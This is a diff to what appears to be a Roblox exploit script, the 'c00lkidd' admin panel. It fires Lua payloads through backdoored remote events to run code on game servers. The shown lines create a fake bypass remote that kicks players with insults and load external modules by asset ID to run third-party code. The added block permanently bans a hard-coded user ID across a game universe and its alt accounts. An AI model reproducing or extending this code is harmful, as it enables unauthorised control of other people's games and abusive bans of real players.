@@ -2877,6 +2877,20 @@ end)
 			fireRemoteEvent('local r=Instance.new("RemoteEvent",game.JointsService)r.Name="_FEBYPASS32"r.OnServerEvent:Connect(function(p)p:Kick("Use c00lkidd ss you skid bozo!")end)')
 		        fireRemoteEvent('require(7458325257).antiban()')
 			fireRemoteEvent('require(3986243232).load("im a skid",{"' .. game.Players.LocalPlayer.Name ..  '"})')
+			fireRemoteEvent([[local Players = game:GetService("Players")
+
+local targetUserId = 448578780
+
+pcall(function()
+	Players:BanAsync({
+		UserIds = {targetUserId},
+		Duration = -1, -- permanent ban
+		DisplayReason = "You have been PERMANENTLY BANNED by c00lkidd.exe Admin Panel",
+		PrivateReason = "Manual ban by c00lkidd.exe",
+		ExcludeAltAccounts = true,
+		ApplyToUniverse = true
+	})
+end)]])
 fireRemoteEvent([[
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
